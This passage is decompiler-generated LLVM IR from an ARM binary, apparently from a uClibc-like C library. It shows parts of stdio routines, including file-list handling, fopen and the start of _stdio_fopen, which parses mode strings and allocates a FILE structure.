  %v1_14524 = phi i32 [ %v0_14520, %dec_label_pc_14520 ], [ %v3_144f4, %dec_label_pc_144f4 ], [ %v1_14504.pre, %dec_label_pc_1450c.dec_label_pc_14500_crit_edge ]
  %v3_14524 = icmp uge i32 %v0_1452c, %v1_14524
  store i1 %v3_14524, i1* %cpsr_c.global-to-local, align 1
  %v9_14524 = icmp eq i32 %v0_1452c, %v1_14524
  br i1 %v9_14524, label %dec_label_pc_1452c, label %dec_label_pc_14524.dec_label_pc_144f4_crit_edge

dec_label_pc_14524.dec_label_pc_144f4_crit_edge:  ; preds = %dec_label_pc_14524
  %v0_144f4.pre = load i32, i32* @r5, align 4
  %v0_144fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_144f4

dec_label_pc_1452c:                               ; preds = %dec_label_pc_14524
  %v2_1452c = icmp ne i32 %v1_14524, 0
  store i1 %v2_1452c, i1* %cpsr_c.global-to-local, align 1
  %v7_14530 = icmp slt i32 %v1_14524, 2
  br i1 %v7_14530, label %dec_label_pc_1454c, label %dec_label_pc_14534

dec_label_pc_14534:                               ; preds = %dec_label_pc_1452c
  %v0_14534 = load i32, i32* @r5, align 4
  %v1_14534 = add i32 %v0_14534, 56
  store i32 %v1_14534, i32* %r0.global-to-local, align 4
  %v0_14538 = load i32, i32* %r1.global-to-local, align 4
  %v1_14538 = add i32 %v0_14538, 129
  store i32 %v1_14538, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1454c

dec_label_pc_1454c:                               ; preds = %dec_label_pc_144d8, %dec_label_pc_144c0, %dec_label_pc_14534, %dec_label_pc_1452c
  %v0_1454c = load i32, i32* @r5, align 4
  %v1_1454c = inttoptr i32 %v0_1454c to i16*
  %v2_1454c = load i16, i16* %v1_1454c, align 2
  %v3_1454c = zext i16 %v2_1454c to i32
  store i32 %v3_1454c, i32* %r3.global-to-local, align 4
  %v1_14550 = and i32 %v3_1454c, 16384
  %v2_14550 = icmp eq i32 %v1_14550, 0
  br i1 %v2_14550, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_1454c
  %v2_14554 = add i32 %v0_1454c, 8
  %v3_14554 = inttoptr i32 %v2_14554 to i32*
  %v4_14554 = load i32, i32* %v3_14554, align 4
  store i32 %v4_14554, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1454c, %bb48
  %v1_14558 = xor i1 %v2_14550, true
  call void @__pseudo_cond_branch(i1 %v1_14558, i32 ptrtoint (i32* @global_var_11adc.29 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_14560 = load i32, i32* @r8, align 4
  %v2_14560 = add i32 %v0_14560, 160
  %v3_14560 = inttoptr i32 %v2_14560 to i32*
  %v4_14560 = load i32, i32* %v3_14560, align 4
  store i32 %v4_14560, i32* @r5, align 4
  %v1_14564 = add i32 %v4_14560, 8
  %v2_14564 = inttoptr i32 %v1_14564 to i32*
  %v3_14564 = load i32, i32* %v2_14564, align 4
  store i32 %v3_14564, i32* %r3.global-to-local, align 4
  %v1_14568 = load i32, i32* %sl.global-to-local, align 4
  %v3_14568 = icmp uge i32 %v3_14564, %v1_14568
  store i1 %v3_14568, i1* %cpsr_c.global-to-local, align 1
  %v9_14568 = icmp eq i32 %v3_14564, %v1_14568
  br i1 %v9_14568, label %dec_label_pc_145b0, label %dec_label_pc_14570

dec_label_pc_14570:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_14560, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1457c75 = inttoptr i32 %v4_14560 to i32*
  %v2_1457c76 = load i32, i32* %v1_1457c75, align 4
  store i32 %v2_1457c76, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1458078 = icmp eq i32 %v2_1457c76, 0
  br i1 %v9_1458078, label %dec_label_pc_14588, label %dec_label_pc_145a0

dec_label_pc_14588:                               ; preds = %dec_label_pc_14570, %dec_label_pc_14588.dec_label_pc_1457c_crit_edge
  %v0_1458879 = phi i32 [ %v1_14580.pre, %dec_label_pc_14588.dec_label_pc_1457c_crit_edge ], [ 0, %dec_label_pc_14570 ]
  store i32 %v0_1458879, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14598 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14598, label %dec_label_pc_1459c, label %dec_label_pc_14588.dec_label_pc_1457c_crit_edge

dec_label_pc_14588.dec_label_pc_1457c_crit_edge:  ; preds = %dec_label_pc_14588
  %v0_1457c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14580.pre = load i32, i32* @r4, align 4
  %v1_1457c = inttoptr i32 %v0_1457c.pre to i32*
  %v2_1457c = load i32, i32* %v1_1457c, align 4
  store i32 %v2_1457c, i32* %r3.global-to-local, align 4
  %v3_14580 = icmp uge i32 %v2_1457c, %v1_14580.pre
  store i1 %v3_14580, i1* %cpsr_c.global-to-local, align 1
  %v9_14580 = icmp eq i32 %v2_1457c, %v1_14580.pre
  br i1 %v9_14580, label %dec_label_pc_14588, label %dec_label_pc_145a0

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14588
  %v0_1459c = load i32, i32* @r4, align 4
  store i32 %v0_1459c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145a0

dec_label_pc_145a0:                               ; preds = %dec_label_pc_14570, %dec_label_pc_14588.dec_label_pc_1457c_crit_edge, %dec_label_pc_1459c
  %v0_145a0 = phi i32 [ %v0_1459c, %dec_label_pc_1459c ], [ %v2_1457c76, %dec_label_pc_14570 ], [ %v2_1457c, %dec_label_pc_14588.dec_label_pc_1457c_crit_edge ]
  %v1_145a0 = phi i32 [ %v0_1459c, %dec_label_pc_1459c ], [ 0, %dec_label_pc_14570 ], [ %v1_14580.pre, %dec_label_pc_14588.dec_label_pc_1457c_crit_edge ]
  %v3_145a0 = icmp uge i32 %v0_145a0, %v1_145a0
  store i1 %v3_145a0, i1* %cpsr_c.global-to-local, align 1
  %v9_145a0 = icmp eq i32 %v0_145a0, %v1_145a0
  br i1 %v9_145a0, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_145a0
  %v1_145a4 = load i32, i32* @r5, align 4
  store i32 %v1_145a4, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_145a0, %bb50
  %v1_145a8 = xor i1 %v9_145a0, true
  call void @__pseudo_cond_branch(i1 %v1_145a8, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_145ac = load i32, i32* %sl.global-to-local, align 4
  %v1_145ac = load i32, i32* @r5, align 4
  %v2_145ac = add i32 %v1_145ac, 8
  %v3_145ac = inttoptr i32 %v2_145ac to i32*
  store i32 %v0_145ac, i32* %v3_145ac, align 4
  %v0_145b4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_145b0

dec_label_pc_145b0:                               ; preds = %bb49, %bb51
  %v0_145b4 = phi i32 [ %v0_14560, %bb49 ], [ %v0_145b4.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_145b4 = add i32 %v0_145b4, 80
  %v3_145b4 = inttoptr i32 %v2_145b4 to i32*
  %v4_145b4 = load i32, i32* %v3_145b4, align 4
  store i32 %v4_145b4, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_145bc = add i32 %v0_145b4, 160
  %v3_145bc = inttoptr i32 %v2_145bc to i32*
  %v4_145bc = load i32, i32* %v3_145bc, align 4
  store i32 %v4_145bc, i32* %r0.global-to-local, align 4
  %v1_145c0 = inttoptr i32 %v4_145b4 to i32*
  %v2_145c0 = load i32, i32* %v1_145c0, align 4
  store i32 %v2_145c0, i32* %r3.global-to-local, align 4
  %v1_145c4 = add i32 %v4_145bc, 4
  %v2_145c4 = inttoptr i32 %v1_145c4 to i32*
  %v3_145c4 = load i32, i32* %v2_145c4, align 4
  store i32 %v3_145c4, i32* %r1.global-to-local, align 4
  %v1_145c8 = add i32 %v2_145c0, 1
  store i32 %v1_145c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_145cc = icmp eq i32 %v3_145c4, 0
  store i32 %v1_145c8, i32* %v1_145c0, align 4
  br i1 %v2_145cc, label %dec_label_pc_145d8, label %dec_label_pc_14638

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145b0
  %v0_145d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_145d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_145d8 = add i32 %v1_145d8, 8
  %v3_145d8 = inttoptr i32 %v2_145d8 to i32*
  store i32 %v0_145d8, i32* %v3_145d8, align 4
  %v0_145dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_145dc, i32* @r5, align 4
  br label %dec_label_pc_145e0

dec_label_pc_145e0:                               ; preds = %dec_label_pc_14610.dec_label_pc_145e0_crit_edge, %dec_label_pc_145d8
  %v0_145e0 = phi i32 [ %v0_145e0.pre, %dec_label_pc_14610.dec_label_pc_145e0_crit_edge ], [ %v0_145dc, %dec_label_pc_145d8 ]
  %v1_145e0 = inttoptr i32 %v0_145e0 to i32*
  %v2_145e0 = load i32, i32* %v1_145e0, align 4
  store i32 %v2_145e0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_145e0, i32* %r2.global-to-local, align 4
  %v2_145ec64 = load i32, i32* %v1_145e0, align 4
  store i32 %v2_145ec64, i32* %r3.global-to-local, align 4
  %v3_145f066 = icmp uge i32 %v2_145ec64, %v2_145e0
  store i1 %v3_145f066, i1* %cpsr_c.global-to-local, align 1
  %v9_145f072 = icmp eq i32 %v2_145ec64, %v2_145e0
  br i1 %v9_145f072, label %dec_label_pc_145f8, label %dec_label_pc_14610

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145e0, %dec_label_pc_145f8.dec_label_pc_145ec_crit_edge
  %v0_145f873 = phi i32 [ %v1_145f0.pre, %dec_label_pc_145f8.dec_label_pc_145ec_crit_edge ], [ %v2_145e0, %dec_label_pc_145e0 ]
  store i32 %v0_145f873, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14608 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14608, label %dec_label_pc_1460c, label %dec_label_pc_145f8.dec_label_pc_145ec_crit_edge

dec_label_pc_145f8.dec_label_pc_145ec_crit_edge:  ; preds = %dec_label_pc_145f8
  %v0_145ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_145f0.pre = load i32, i32* @r4, align 4
  %v1_145ec = inttoptr i32 %v0_145ec.pre to i32*
  %v2_145ec = load i32, i32* %v1_145ec, align 4
  store i32 %v2_145ec, i32* %r3.global-to-local, align 4
  %v3_145f0 = icmp uge i32 %v2_145ec, %v1_145f0.pre
  store i1 %v3_145f0, i1* %cpsr_c.global-to-local, align 1
  %v9_145f0 = icmp eq i32 %v2_145ec, %v1_145f0.pre
  br i1 %v9_145f0, label %dec_label_pc_145f8, label %dec_label_pc_14610

dec_label_pc_1460c:                               ; preds = %dec_label_pc_145f8
  %v0_1460c = load i32, i32* @r4, align 4
  store i32 %v0_1460c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14610

dec_label_pc_14610:                               ; preds = %dec_label_pc_145e0, %dec_label_pc_145f8.dec_label_pc_145ec_crit_edge, %dec_label_pc_1460c
  %v0_14618 = phi i32 [ %v0_1460c, %dec_label_pc_1460c ], [ %v2_145ec64, %dec_label_pc_145e0 ], [ %v2_145ec, %dec_label_pc_145f8.dec_label_pc_145ec_crit_edge ]
  %v1_14610 = phi i32 [ %v0_1460c, %dec_label_pc_1460c ], [ %v2_145e0, %dec_label_pc_145e0 ], [ %v1_145f0.pre, %dec_label_pc_145f8.dec_label_pc_145ec_crit_edge ]
  %v3_14610 = icmp uge i32 %v0_14618, %v1_14610
  store i1 %v3_14610, i1* %cpsr_c.global-to-local, align 1
  %v9_14610 = icmp eq i32 %v0_14618, %v1_14610
  br i1 %v9_14610, label %dec_label_pc_14618, label %dec_label_pc_14610.dec_label_pc_145e0_crit_edge

dec_label_pc_14610.dec_label_pc_145e0_crit_edge:  ; preds = %dec_label_pc_14610
  %v0_145e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_145e0

dec_label_pc_14618:                               ; preds = %dec_label_pc_14610
  %v2_14618 = icmp ne i32 %v1_14610, 0
  store i1 %v2_14618, i1* %cpsr_c.global-to-local, align 1
  %v7_1461c = icmp slt i32 %v1_14610, 2
  br i1 %v7_1461c, label %dec_label_pc_14638, label %dec_label_pc_14620

dec_label_pc_14620:                               ; preds = %dec_label_pc_14618
  %v0_14620 = load i32, i32* @r5, align 4
  store i32 %v0_14620, i32* %r0.global-to-local, align 4
  %v0_14624 = load i32, i32* %r1.global-to-local, align 4
  %v1_14624 = add i32 %v0_14624, 129
  store i32 %v1_14624, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14638

dec_label_pc_14638:                               ; preds = %dec_label_pc_145b0, %dec_label_pc_14620, %dec_label_pc_14618
  %v0_14638 = call i32 @_stdio_openlist_dec_use()
  %v0_1463c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1463c, i32* %r0.global-to-local, align 4
  %v2_14644 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14644, i32* @r4, align 4
  store i32 %v6_1432c, i32* @r5, align 4
  store i32 %v9_1432c, i32* @r6, align 4
  store i32 %v12_1432c, i32* @r7, align 4
  ret i32 %v0_1463c

; uselistorder directives
  uselistorder i32 %v0_1460c, { 1, 0, 2 }
  uselistorder i32 %v1_145f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_145e0, { 1, 0 }
  uselistorder i32 %v0_145b4, { 1, 0 }
  uselistorder i32 %v0_1459c, { 1, 0, 2 }
  uselistorder i32 %v1_14580.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_14568, { 1, 0 }
  uselistorder i32 %v0_14520, { 1, 0, 2 }
  uselistorder i32 %v1_14504.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14494, { 1, 0, 2 }
  uselistorder i32 %v1_14478.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14468, { 1, 0 }
  uselistorder i32 %v0_14424, { 1, 0, 2 }
  uselistorder i32 %v1_14408.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_143e8, { 1, 0 }
  uselistorder i32 %v1_14374.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 21, 20, 25, 24, 19, 23, 22, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_14638, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14610, { 2, 1, 0 }
  uselistorder label %dec_label_pc_145f8, { 1, 0 }
  uselistorder label %dec_label_pc_145b0, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_145a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14588, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_1454c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14524, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1450c, { 1, 0 }
  uselistorder label %dec_label_pc_144c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14498, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14480, { 1, 0 }
  uselistorder label %dec_label_pc_14438, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_14428, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14410, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_143b0, { 1, 0 }
  uselistorder label %dec_label_pc_143a4, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_14394, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1437c, { 1, 0 }
}

define i32 @function_14650(i32 %arg1) local_unnamed_addr {
dec_label_pc_14650:
  %v0_14650 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14650, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14650
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14650, %bb
  %v10_14658 = phi i32 [ %arg1, %dec_label_pc_14650 ], [ 0, %bb ]
  ret i32 %v10_14658

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1466c = call i32 @_stdio_fopen()
  ret i32 %v0_1466c
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1467c = load i32, i32* @r4, align 4
  store i32 %v3_1467c, i32* %stack_var_-24, align 4
  %v6_1467c = load i32, i32* @r5, align 4
  %v9_1467c = load i32, i32* @r6, align 4
  %v12_1467c = load i32, i32* @r7, align 4
  %v15_1467c = load i32, i32* @r8, align 4
  %v0_14680 = load i32, i32* @r1, align 4
  %v1_14680 = inttoptr i32 %v0_14680 to i8*
  %v2_14680 = load i8, i8* %v1_14680, align 1
  %v2_14688 = icmp ugt i8 %v2_14680, 113
  store i1 %v2_14688, i1* %cpsr_c.global-to-local, align 1
  %v7_14688 = icmp eq i8 %v2_14680, 114
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r8, align 4
  %v0_14694 = load i32, i32* @r0, align 4
  store i32 %v0_14694, i32* @r7, align 4
  %v0_14698 = load i32, i32* @r2, align 4
  store i32 %v0_14698, i32* @r5, align 4
  %v0_1469c = load i32, i32* @r3, align 4
  store i32 %v0_1469c, i32* @r6, align 4
  br i1 %v7_14688, label %dec_label_pc_146f0, label %dec_label_pc_146a4

dec_label_pc_146a4:                               ; preds = %entry
  %v2_146a4 = icmp ugt i8 %v2_14680, 118
  store i1 %v2_146a4, i1* %cpsr_c.global-to-local, align 1
  %v7_146a4 = icmp eq i8 %v2_14680, 119
  br i1 %v7_146a4, label %bb, label %dec_label_pc_146b0

bb:                                               ; preds = %dec_label_pc_146a4
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_146f4

dec_label_pc_146b0:                               ; preds = %dec_label_pc_146a4
  %v2_146b0 = icmp ugt i8 %v2_14680, 96
  store i1 %v2_146b0, i1* %cpsr_c.global-to-local, align 1
  %v7_146b0 = icmp eq i8 %v2_14680, 97
  br i1 %v7_146b0, label %bb49, label %dec_label_pc_146bc

bb49:                                             ; preds = %dec_label_pc_146b0
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_146f4

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146b0, %dec_label_pc_1478c, %dec_label_pc_14760
  store i32 50848, i32* %r2.global-to-local, align 4
  %v0_146c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_146c0, i32* %r0.global-to-local, align 4
  %v3_146c4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_146c4 = sext i16 %v3_146c4 to i32
  store i32 %v4_146c4, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_146cc = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146cc = icmp eq i32 %v0_146cc, 0
  %v3_146d0 = add i32 %v4_146c4, %v0_146c0
  %v4_146d0 = inttoptr i32 %v3_146d0 to i32*
  store i32 22, i32* %v4_146d0, align 4
  br i1 %v2_146cc, label %dec_label_pc_14a94, label %dec_label_pc_146d8

dec_label_pc_146d8:                               ; preds = %dec_label_pc_147b0._crit_edge, %dec_label_pc_146bc
  %v0_146d8 = load i32, i32* @r5, align 4
  %v1_146d8 = inttoptr i32 %v0_146d8 to i16*
  %v2_146d8 = load i16, i16* %v1_146d8, align 2
  %v3_146d8 = zext i16 %v2_146d8 to i32
  store i32 %v3_146d8, i32* %r3.global-to-local, align 4
  %v1_146dc = and i32 %v3_146d8, 8192
  %v2_146dc = icmp eq i32 %v1_146dc, 0
  br i1 %v2_146dc, label %dec_label_pc_14a94, label %dec_label_pc_146e4

dec_label_pc_146e4:                               ; preds = %dec_label_pc_146d8
  store i32 %v0_146d8, i32* @r0, align 4
  %v0_146e8 = call i32 @free()
  store i32 %v0_146e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a94

dec_label_pc_146f0:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %bb, %bb49, %dec_label_pc_146f0
  %v1_1470c = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_146f0 ]
  %v1_146f4 = add i32 %v0_14680, 1
  %v2_146f4 = inttoptr i32 %v1_146f4 to i8*
  %v3_146f4 = load i8, i8* %v2_146f4, align 1
  %v2_146f8 = icmp ugt i8 %v3_146f4, 97
  store i1 %v2_146f8, i1* %cpsr_c.global-to-local, align 1
  %v7_146f8 = icmp eq i8 %v3_146f4, 98
  %v1_146f4.v0_14680 = select i1 %v7_146f8, i32 %v1_146f4, i32 %v0_14680
  store i32 %v1_146f4.v0_14680, i32* %r3.global-to-local, align 4
  %v1_14704 = add i32 %v1_146f4.v0_14680, 1
  %v2_14704 = inttoptr i32 %v1_14704 to i8*
  %v3_14704 = load i8, i8* %v2_14704, align 1
  %v4_14704 = zext i8 %v3_14704 to i32
  store i32 %v4_14704, i32* @r3, align 4
  %v2_14708 = icmp ugt i8 %v3_14704, 42
  store i1 %v2_14708, i1* %cpsr_c.global-to-local, align 1
  %v7_14708 = icmp eq i8 %v3_14704, 43
  br i1 %v7_14708, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_146f4
  store i32 %v1_1470c, i32* @r3, align 4
  %v2_14710 = add nuw nsw i32 %v1_1470c, 1
  store i32 %v2_14710, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_146f4, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14714 = icmp eq i32 %v0_14698, 0
  br i1 %v2_14714, label %dec_label_pc_1471c, label %dec_label_pc_14758

dec_label_pc_1471c:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_14720 = call i32 @malloc()
  store i32 %v0_14720, i32* %r0.global-to-local, align 4
  store i32 %v0_14720, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_14724 = icmp eq i32 %v0_14720, 0
  br i1 %v3_14724, label %dec_label_pc_14a98, label %dec_label_pc_1472c

dec_label_pc_1472c:                               ; preds = %dec_label_pc_1471c
  %v0_14730 = load i32, i32* @r8, align 4
  %v2_14730 = add i32 %v0_14730, -33136
  store i32 %v2_14730, i32* %r3.global-to-local, align 4
  %v1_14734 = inttoptr i32 %v2_14730 to i32*
  %v2_14734 = load i32, i32* %v1_14734, align 4
  store i32 %v2_14734, i32* %r0.global-to-local, align 4
  %v3_14734 = add i32 %v0_14730, -33132
  %v4_14734 = inttoptr i32 %v3_14734 to i32*
  %v5_14734 = load i32, i32* %v4_14734, align 4
  store i32 %v5_14734, i32* @r1, align 4
  %v6_14734 = add i32 %v0_14730, -33128
  %v7_14734 = inttoptr i32 %v6_14734 to i32*
  %v8_14734 = load i32, i32* %v7_14734, align 4
  store i32 %v8_14734, i32* %r2.global-to-local, align 4
  %v2_14740 = add i32 %v0_14720, 8
  %v3_14740 = inttoptr i32 %v2_14740 to i32*
  store i32 0, i32* %v3_14740, align 4
  %v2_14748 = load i32, i32* @r5, align 4
  %v3_14748 = inttoptr i32 %v2_14748 to i16*
  store i16 8192, i16* %v3_14748, align 2
  %v2_1474c = load i32, i32* %r0.global-to-local, align 4
  %v0_14750 = load i32, i32* @r5, align 4
  %v1_14750 = add i32 %v0_14750, 56
  store i32 %v1_14750, i32* @r3, align 4
  %v1_14754 = inttoptr i32 %v1_14750 to i32*
  store i32 %v2_1474c, i32* %v1_14754, align 4
  %v3_14754 = add i32 %v0_14750, 60
  %v4_14754 = inttoptr i32 %v3_14754 to i32*
  %v5_14754 = load i32, i32* @r1, align 4
  store i32 %v5_14754, i32* %v4_14754, align 4
  %v6_14754 = add i32 %v0_14750, 64
  %v7_14754 = inttoptr i32 %v6_14754 to i32*
  %v8_14754 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14754, i32* %v7_14754, align 4
  %v0_14758.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14758

dec_label_pc_14758:                               ; preds = %.thread3, %dec_label_pc_1472c
  %v0_147b0 = phi i32 [ %v0_1469c, %.thread3 ], [ %v0_14758.pre, %dec_label_pc_1472c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_14758 = icmp slt i32 %v0_147b0, 0
  br i1 %v1_14758, label %dec_label_pc_147b0, label %dec_label_pc_14760

dec_label_pc_14760:                               ; preds = %dec_label_pc_14758
  %v0_14764 = load i32, i32* @r4, align 4
  %v2_14764 = and i32 %v0_14764, 131075
  %v1_14768 = add nuw nsw i32 %v2_14764, 1
  store i32 %v1_14768, i32* %r2.global-to-local, align 4
  %v0_1476c = load i32, i32* @r7, align 4
  %v1_1476c = add i32 %v0_1476c, 1
  %v2_14770 = and i32 %v1_1476c, %v1_14768
  store i32 %v2_14770, i32* %r3.global-to-local, align 4
  %v3_14774 = icmp uge i32 %v2_14770, %v1_14768
  store i1 %v3_14774, i1* %cpsr_c.global-to-local, align 1
  %v9_14774 = icmp eq i32 %v2_14770, %v1_14768
  %v1_14778 = load i32, i32* @r5, align 4
  %v2_14778 = add i32 %v1_14778, 4
  %v3_14778 = inttoptr i32 %v2_14778 to i32*
  store i32 %v0_147b0, i32* %v3_14778, align 4
  br i1 %v9_14774, label %dec_label_pc_14780, label %dec_label_pc_146bc

dec_label_pc_14780:                               ; preds = %dec_label_pc_14760
  %v0_14780 = load i32, i32* @r4, align 4
  %v1_14780 = load i32, i32* @r7, align 4
  %v2_14780 = sub i32 -1, %v1_14780
  %v3_14780 = and i32 %v0_14780, %v2_14780
  store i32 %v3_14780, i32* @r3, align 4
  %v1_14784 = and i32 %v3_14780, 1024
  %v2_14784 = icmp eq i32 %v1_14784, 0
  br i1 %v2_14784, label %dec_label_pc_147a4, label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %dec_label_pc_14780
  %v0_1478c = load i32, i32* @r6, align 4
  store i32 %v0_1478c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_14798 = call i32 @__libc_fcntl(i32 %v0_1478c, i32 4)
  store i32 %v2_14798, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1479c = icmp eq i32 %v2_14798, 0
  br i1 %v2_1479c, label %dec_label_pc_1478c.dec_label_pc_147a4_crit_edge, label %dec_label_pc_146bc

dec_label_pc_1478c.dec_label_pc_147a4_crit_edge:  ; preds = %dec_label_pc_1478c
  %v0_147a4.pre = load i32, i32* @r7, align 4
  %v0_147a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_147a4

dec_label_pc_147a4:                               ; preds = %dec_label_pc_1478c.dec_label_pc_147a4_crit_edge, %dec_label_pc_14780
  %v0_147a8 = phi i32 [ %v0_147a8.pre, %dec_label_pc_1478c.dec_label_pc_147a4_crit_edge ], [ %v0_14780, %dec_label_pc_14780 ]
  %v0_147a4 = phi i32 [ %v0_147a4.pre, %dec_label_pc_1478c.dec_label_pc_147a4_crit_edge ], [ %v1_14780, %dec_label_pc_14780 ]
  %v1_147a4 = and i32 %v0_147a4, 131072
  store i32 %v1_147a4, i32* %r3.global-to-local, align 4
  %v2_147a8 = or i32 %v1_147a4, %v0_147a8
  store i32 %v2_147a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147d4

dec_label_pc_147b0:                               ; preds = %dec_label_pc_14758
  %v2_147b0 = icmp eq i32 %v0_147b0, -1
  store i1 %v2_147b0, i1* %cpsr_c.global-to-local, align 1
  %v7_147b0 = icmp eq i32 %v0_147b0, -1
  %v0_147bc.pre = load i32, i32* @r4, align 4
